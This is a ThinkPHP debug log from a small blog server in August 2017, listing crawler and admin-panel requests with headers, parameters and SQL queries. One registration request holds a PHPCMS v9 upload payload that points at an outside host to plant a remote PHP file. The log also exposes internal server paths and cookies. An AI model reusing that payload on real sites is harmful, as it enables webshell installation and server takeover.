[ log ] hhqblog.com/ [运行时间：0.033058s][吞吐率：30.25req/s] [内存消耗：5,988.73kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'Keep-Alive',
  'user-agent' => 'Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)',
  'from' => 'support@search.yandex.ru',
  'accept-encoding' => 'gzip,deflate',
  'accept-language' => 'ru, uk;q=0.8, be;q=0.8, en;q=0.7, *;q=0.01',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000305s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000827s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000705s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000435s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000375s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001030s ]

---------------------------------------------------------------
[ 2017-08-10T05:09:21+08:00 ] 172.17.180.47 52.3.248.206 GET /
[ log ] hhqblog.com/ [运行时间：0.035808s][吞吐率：27.93req/s] [内存消耗：5,930.63kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'accept' => '*/*',
  'accept-encoding' => 'gzip',
  'user-agent' => 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000321s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000804s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000929s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000442s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000471s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000350s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000446s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000341s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000794s ]

---------------------------------------------------------------
[ 2017-08-10T05:15:16+08:00 ] 172.17.180.47 54.185.218.205 GET /
[ log ] hhqblog.com/ [运行时间：0.033114s][吞吐率：30.20req/s] [内存消耗：5,987.95kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0; en-US; rv:1.9.2.3) Gecko/20100401 Firefox/3.6.3 GTB6 (.NET CLR 3.5.30729)',
  'host' => 'hhqblog.com',
  'connection' => 'Keep-Alive',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000340s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000841s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000710s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000434s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000384s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000934s ]

---------------------------------------------------------------
[ 2017-08-10T06:21:30+08:00 ] 172.17.180.47 106.11.153.67 GET /ar/35.html
[ log ] www.hhqblog.com/ar/35.html [运行时间：0.032594s][吞吐率：30.68req/s] [内存消耗：4,424.98kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'Artical',
    2 => 'detail',
  ),
  'convert' => false,
)
[ info ] [ HEADER ] array (
  'accept-language' => 'zh-cn,en-us,zh-tw,en-gb,en;',
  'host' => 'www.hhqblog.com',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'connection' => 'Keep-Alive',
  'user-agent' => 'YisouSpider',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'id' => '35',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Artical->detail[ /yjdata/www/hhqblog/application/index/controller/Artical.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/artical/detail.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'article',
  5 => 'allpage',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000290s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000802s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000923s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000429s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000441s ]
[ sql ] [ SQL ] SELECT `a`.*,`ca`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ca` ON `a`.`cate_id`=`ca`.`id` WHERE  `a`.`id` = 35 LIMIT 1 [ RunTime:0.000275s ]

---------------------------------------------------------------
[ 2017-08-10T09:13:40+08:00 ] 172.17.180.47 220.181.108.183 GET /
[ log ] www.hhqblog.com/ [运行时间：0.036713s][吞吐率：27.24req/s] [内存消耗：5,931.12kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)',
  'accept-language' => 'zh-cn,zh-tw',
  'if-none-match' => '"@NULL@"',
  'accept-encoding' => 'gzip',
  'accept' => '*/*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000298s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000801s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000946s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000433s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000463s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000344s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000367s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000373s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000971s ]

---------------------------------------------------------------
[ 2017-08-10T09:13:52+08:00 ] 172.17.180.47 111.206.221.82 GET /index/index/index.html?page=1
[ log ] www.hhqblog.com/index/index/index.html?page=1 [运行时间：0.037486s][吞吐率：26.68req/s] [内存消耗：5,964.06kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'www.hhqblog.com',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; Baiduspider-render/2.0; +http://www.baidu.com/search/spider.html)',
  'proxy-connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-devtools-emulate-network-conditions-client-id' => '31bd7ca6-d373-48fd-bb95-959eaa3aff95',
  'x-requested-with' => 'XMLHttpRequest',
  'accept-language' => 'zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3',
  'resource-type' => '13',
  'referer' => 'http://www.hhqblog.com/',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000304s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000832s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000742s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000435s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000458s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000966s ]

---------------------------------------------------------------
[ 2017-08-10T11:19:49+08:00 ] 172.17.180.47 140.205.225.187 POST /index.php?m=member&c=index&a=register&siteid=1
[ log ] www.hhqblog.com:80/index.php?m=member&c=index&a=register&siteid=1 [运行时间：0.037445s][吞吐率：26.71req/s] [内存消耗：5,932.76kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'identity',
  'content-length' => '171',
  'host' => 'www.hhqblog.com:80',
  'content-type' => 'application/x-www-form-urlencoded',
  'connection' => 'close',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1;Alibaba.Security.Heimdall.6577126.phpcmsv9-register-upload)',
)
[ info ] [ PARAM ] array (
  'm' => 'member',
  'c' => 'index',
  'a' => 'register',
  'siteid' => '1',
  'modelid' => '11',
  'username' => 'rDHILPRY',
  'password' => 'rDHILPRY',
  'email' => 'rDHILPRY@aliyun.com',
  'info' => 
  array (
    'content' => '<img src=http://120.26.55.211/s.txt?.php#.jpg>',
  ),
  'dosubmit' => '1',
  'protocol' => '',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000335s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000832s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `is_tui` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000990s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1 ORDER BY id desc LIMIT 8 [ RunTime:0.000513s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000574s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 1 ORDER BY id desc LIMIT 6 [ RunTime:0.000382s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000368s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000396s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.000866s ]

---------------------------------------------------------------
[ 2017-08-10T11:20:08+08:00 ] 172.17.180.47 123.233.116.122 GET /
[ log ] hhqblog.com/ [运行时间：0.035351s][吞吐率：28.29req/s] [内存消耗：5,988.98kb] [文件加载：56]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.9.1502261738.1502261738.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/index/view/index/index.html [ array (
  0 => 'menu',
  1 => 'recommend',
  2 => 'newarticle',
  3 => 'hot',
  4 => 'list',
  5 => 'allpage',
  6 => 'top_line',
  7 => 'carousel',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000333s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000873s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000748s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000446s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000381s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001018s ]

---------------------------------------------------------------
[ 2017-08-10T11:20:09+08:00 ] 172.17.180.47 123.233.116.122 GET /index/index/index.html?page=1
[ log ] hhqblog.com/index/index/index.html?page=1 [运行时间：0.039450s][吞吐率：25.35req/s] [内存消耗：5,963.94kb] [文件加载：55]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => 'index',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.9.1502261738.1502261738.',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
)
[ info ] [ CACHE ] INIT File
[ info ] [ DB ] INIT mysql
[ info ] [ RUN ] app\index\controller\Index->index[ /yjdata/www/hhqblog/application/index/controller/Index.php ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000314s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000863s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` ORDER BY views desc LIMIT 8 [ RunTime:0.000752s ]
[ sql ] [ SQL ] SELECT * FROM `think_article` WHERE  `status` = 1  AND `type` = 2 ORDER BY id desc LIMIT 6 [ RunTime:0.000469s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` WHERE  `status` = 1 LIMIT 1 [ RunTime:0.000387s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` WHERE  `a`.`status` = 1 ORDER BY id desc LIMIT 0,15 [ RunTime:0.001064s ]

---------------------------------------------------------------
[ 2017-08-10T11:20:37+08:00 ] 172.17.180.47 123.233.116.122 GET /admin
[ log ] hhqblog.com/admin [运行时间：0.017236s][吞吐率：58.02req/s] [内存消耗：1,977.95kb] [文件加载：44]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->index[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/public/index.html [ array (
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T11:20:37+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/index/main.html
[ log ] hhqblog.com/admin/index/main.html [运行时间：0.015047s][吞吐率：66.46req/s] [内存消耗：1,900.90kb] [文件加载：43]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'index',
    2 => 'main',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Index->main[ /yjdata/www/hhqblog/application/admin/controller/Index.php ]
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/index/index.html [ array (
  0 => 'info',
) ]
[ info ] [ LOG ] INIT File

---------------------------------------------------------------
[ 2017-08-10T11:20:42+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html
[ log ] hhqblog.com/admin/article/index.html [运行时间：0.027176s][吞吐率：36.80req/s] [内存消耗：3,762.98kb] [文件加载：53]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'upgrade-insecure-requests' => '1',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
  'referer' => 'http://hhqblog.com/admin',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ VIEW ] /yjdata/www/hhqblog/public/../application/admin/view/article/index.html [ array (
  0 => 'allpage',
  1 => 'current',
  2 => 'keyword',
  3 => 'count',
) ]
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000303s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.000842s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000158s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.000977s ]

---------------------------------------------------------------
[ 2017-08-10T11:20:42+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/index.html?page=1&keyword=
[ log ] hhqblog.com/admin/article/index.html?page=1&keyword= [运行时间：0.047496s][吞吐率：21.05req/s] [内存消耗：3,694.33kb] [文件加载：52]
[ info ] [ LANG ] /yjdata/www/hhqblog/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'article',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'host' => 'hhqblog.com',
  'connection' => 'keep-alive',
  'accept' => 'application/json, text/javascript, */*; q=0.01',
  'x-requested-with' => 'XMLHttpRequest',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.90 Safari/537.36',
  'referer' => 'http://hhqblog.com/admin/article/index.html',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'zh-CN,zh;q=0.8',
  'cookie' => '_pk_id.1.3fef=5dce351e789a92be.1500950707.10.1502335210.1502335210.; _pk_ses.1.3fef=*',
  'content-type' => '',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
  'page' => '1',
  'keyword' => '',
)
[ info ] [ RUN ] app\admin\controller\Article->index[ /yjdata/www/hhqblog/application/admin/controller/Article.php ]
[ info ] [ DB ] INIT mysql
[ info ] [ LOG ] INIT File
[ sql ] [ DB ] CONNECT:[ UseTime:0.000374s ] mysql:dbname=hhqblog;host=127.0.0.1;port=3306;charset=utf8
[ sql ] [ SQL ] SHOW COLUMNS FROM `think_article` [ RunTime:0.001102s ]
[ sql ] [ SQL ] SELECT COUNT(*) AS tp_count FROM `think_article` LIMIT 1 [ RunTime:0.000214s ]
[ sql ] [ SQL ] SELECT `a`.*,`ac`.`name` FROM `think_article` `a` LEFT JOIN `think_article_cate` `ac` ON `a`.`cate_id`=`ac`.`id` ORDER BY a.id desc LIMIT 0,10 [ RunTime:0.001053s ]

---------------------------------------------------------------
[ 2017-08-10T11:20:47+08:00 ] 172.17.180.47 123.233.116.122 GET /admin/article/add_article.html
